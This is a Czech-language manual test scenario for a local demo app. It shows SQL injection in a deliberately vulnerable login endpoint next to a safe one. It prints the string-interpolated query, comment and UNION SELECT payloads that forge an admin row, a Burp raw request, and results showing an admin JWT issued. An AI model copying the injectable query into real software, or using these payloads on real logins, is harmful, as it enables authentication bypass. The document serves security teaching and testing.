# Manual scenario: Raw login SQL Injection

Datum ověření: 2026-08-06

## Účel scénáře

Scénář demonstruje SQL Injection v autentizační logice modelové aplikace Simple Inventory CRM. Nejde o SQLi Lab, ale o samostatný aplikační demo endpoint mimo běžné UI.

## Kontext

Zranitelný endpoint:

```text
POST /api/auth/demo/raw-login
```

Bezpečný endpoint pro porovnání:

```text
POST /api/auth/login
```

Raw login endpoint:

- existuje pouze při `DEMO_VULN=true`,
- při `DEMO_VULN=false` není route namountovaná a vrací `404`,
- nevyžaduje přihlášení, chová se jako demo varianta login endpointu,
- očekává JSON body s poli `email` a `password`.

Sledovaná pole odpovědi:

- HTTP status,
- `error`,
- `token`,
- `user.id`,
- `user.email`,
- `user.name`,
- `user.role`.

Skutečné JWT tokeny jsou v dokumentaci vždy redigované jako `<jwt_token>`.

## Implementační místo

Relevantní soubory:

```text
backend/src/routes/auth.js
backend/src/controllers/authController.js
backend/src/dao/usersDao.js
backend/src/config.js
```

Route je připojena pouze při `DEMO_VULN=true`:

```js
router.post('/login', login);
router.post('/register', register);

if (DEMO_VULN) {
  router.post('/demo/raw-login', demoRawLogin);
}
```

Bezpečný login validuje e-mail přes Joi:

```js
const loginSchema = Joi.object({
  email: Joi.string().email().required(),
  password: Joi.string().required(),
});
```

Bezpečné načtení uživatele používá parametrizovaný dotaz:

```js
async function getUserByEmail(email) {
  const [rows] = await pool.query(
    `SELECT id, email, password_hash, name, role
     FROM users
     WHERE email = ?`,
    [email]
  );
  return rows[0] || null;
}
```

Zranitelný raw login skládá SQL dotaz přímou interpolací hodnoty `email`:

```js
async function rawLogin(email) {
  const sql = `SELECT id, email, password_hash, name, role FROM users WHERE email='${email}'`;
  const [rows] = await pool.query(sql);
  return rows[0] || null;
}
```

Controller následně dělá záměrně naivní porovnání:

```js
if (password !== user.password_hash) {
  return res.status(401).json({ error: 'Invalid credentials' });
}
```

Hlavní exploit používá `UNION`, protože raw SQL dotaz filtruje pouze podle `email`. Samotné zakomentování zbytku dotazu může vrátit skutečný řádek uživatele, ale controller potom porovnává poslaný `password` s uloženým `password_hash`. UNION payload umožní vytvořit kontrolovaný řádek, ve kterém `password_hash` odpovídá poslanému heslu.

## Testovací požadavky

### A. Dostupnost endpointu při DEMO_VULN=false

Význam: ověřit, že demonstračně zranitelná route není dostupná bez explicitního povolení.

```http
POST /api/auth/demo/raw-login
Content-Type: application/json
```

```json
{
  "email": "admin@example.com",
  "password": "wrong-password"
}
```

### B. Kontrolní neúspěšné přihlášení proti raw login endpointu

Význam: běžné špatné údaje nemají vést k přihlášení.

```json
{
  "email": "admin@example.com",
  "password": "wrong-password"
}
```

### C. Komentářový payload jako doplňkový negativní test

Význam: ukázat, že prosté zakomentování nestačí, protože controller stále porovnává `password` s hodnotou `password_hash`.

```json
{
  "email": "admin@example.com' -- ",
  "password": "wrong-password"
}
```

### D. Hlavní UNION payload s kontrolovaným řádkem

Význam: prokázat SQL Injection v autentizační logice vytvořením kontrolovaného uživatelského řádku.

```json
{
  "email": "' UNION SELECT 1,'demo-union@example.com','demo-pass','Demo Admin','admin' -- ",
  "password": "demo-pass"
}
```

### E. UNION payload s nesprávným heslem

Význam: ověřit, že úspěch kroku D závisí na shodě mezi poslaným `password` a hodnotou `password_hash` ve vyrobeném UNION řádku.

```json
{
  "email": "' UNION SELECT 1,'demo-union@example.com','demo-pass','Demo Admin','admin' -- ",
  "password": "wrong-password"
}
```

### F. Bezpečný login endpoint se stejným UNION payloadem

Význam: ověřit, že běžný login endpoint nepřijme injekční payload jako SQL syntaxi.

```http
POST /api/auth/login
Content-Type: application/json
```

```json
{
  "email": "' UNION SELECT 1,'demo-union@example.com','demo-pass','Demo Admin','admin' -- ",
  "password": "demo-pass"
}
```

### G. Bezpečný login endpoint se známým uživatelem a špatným heslem

Význam: ověřit běžné bezpečné chování autentizace.

```json
{
  "email": "admin@example.com",
  "password": "wrong-password"
}
```

## Reprodukce v Burp Suite

Stručný postup pro Burp Repeater:

1. Spustit backend s `DEMO_VULN=true`.
2. Otevřít Burp Suite.
3. Použít Burp Browser nebo nastavit proxy v prohlížeči.
4. Zachytit nebo ručně vytvořit request na `POST /api/auth/demo/raw-login`.
5. Poslat request do Repeateru.
6. V Repeateru měnit hodnoty polí `email` a `password`.
7. Porovnat odpovědi pro běžné špatné heslo, komentářový payload, hlavní UNION payload a bezpečný endpoint `/api/auth/login`.

Raw HTTP request pro hlavní UNION payload:

```http
POST /api/auth/demo/raw-login HTTP/1.1
Host: 127.0.0.1:4000
Content-Type: application/json
Connection: close

{
  "email": "' UNION SELECT 1,'demo-union@example.com','demo-pass','Demo Admin','admin' -- ",
  "password": "demo-pass"
}
```

Pro bezpečný endpoint stačí změnit první řádek na:

```http
POST /api/auth/login HTTP/1.1
```

## Naměřené výsledky

Test byl spuštěn proti lokálnímu backendu:

```text
http://127.0.0.1:4000
```

Krok A byl ověřen na odděleném lokálním portu s `DEMO_VULN=false`. Ostatní kroky byly ověřeny proti běžícímu backendu s `DEMO_VULN=true`.

| Testovací krok | Endpoint | Email payload | Password | HTTP status | Výsledek přihlášení | Token vrácen | Vrácený uživatel | Pozorovaný výsledek |
| --- | --- | --- | --- | ---: | --- | --- | --- | --- |
| A - DEMO_VULN=false | `/api/auth/demo/raw-login` | `admin@example.com` | `wrong-password` | 404 | selhání | ne | žádný | Route není namountovaná a vrací `Not found`. |
| B - raw login špatné heslo | `/api/auth/demo/raw-login` | `admin@example.com` | `wrong-password` | 401 | selhání | ne | žádný | Běžné špatné heslo nevede k přihlášení. |
| C - komentářový payload | `/api/auth/demo/raw-login` | `admin@example.com' -- ` | `wrong-password` | 401 | selhání | ne | žádný | Payload vrátí skutečný řádek, ale heslo se nerovná uloženému hashi. |
| D - hlavní UNION payload | `/api/auth/demo/raw-login` | `' UNION SELECT 1,'demo-union@example.com','demo-pass','Demo Admin','admin' -- ` | `demo-pass` | 200 | úspěch | ano | `demo-union@example.com / admin` | UNION vytvořil kontrolovaný řádek a raw login vydal JWT. |
| E - UNION se špatným heslem | `/api/auth/demo/raw-login` | `' UNION SELECT 1,'demo-union@example.com','demo-pass','Demo Admin','admin' -- ` | `wrong-password` | 401 | selhání | ne | žádný | Úspěch závisí na shodě `password` a kontrolovaného `password_hash`. |
| F - bezpečný login s UNION payloadem | `/api/auth/login` | `' UNION SELECT 1,'demo-union@example.com','demo-pass','Demo Admin','admin' -- ` | `demo-pass` | 400 | selhání | ne | žádný | Bezpečný endpoint payload odmítl validací e-mailu. |
| G - bezpečný login špatné heslo | `/api/auth/login` | `admin@example.com` | `wrong-password` | 401 | selhání | ne | žádný | Bezpečný endpoint nevydal token při špatném hesle. |

## Ukázky odpovědí

### 1. Běžné špatné heslo v raw login endpointu

```json
{
  "error": "Invalid credentials"
}
```

### 2. Hlavní UNION payload v raw login endpointu

```json
{
  "token": "<jwt_token>",
  "user": {
    "id": 1,
    "email": "demo-union@example.com",
    "name": "Demo Admin",
    "role": "admin"
  }
}
```

### 3. Stejný UNION payload proti bezpečnému login endpointu

```json
{
  "error": "\"email\" must be a valid email"
}
```

### 4. UNION payload s nesprávným heslem

```json
{
  "error": "Invalid credentials"
}
```

## Závěr pro scénář

Běžné špatné heslo proti raw login endpointu selhalo a token nebyl vydán.

Komentářový payload `admin@example.com' -- ` také nevedl k přihlášení. Důvodem je, že raw login sice může vrátit skutečný řádek uživatele, ale controller následně porovnává poslané heslo s uloženým `password_hash`.

Hlavním důkazem scénáře je UNION payload, který vytvoří kontrolovaný řádek:

```text
id = 1
email = demo-union@example.com
password_hash = demo-pass
name = Demo Admin
role = admin
```

Protože poslané pole `password` mělo hodnotu `demo-pass`, naivní porovnání v controlleru prošlo a aplikace vydala JWT token s rolí `admin`.

Bezpečný endpoint `POST /api/auth/login` stejný UNION payload odmítl už na validaci e-mailu a při běžném špatném hesle také token nevydal. Scénář tedy ukazuje SQL Injection s přímým dopadem na autentizační rozhodnutí aplikace.
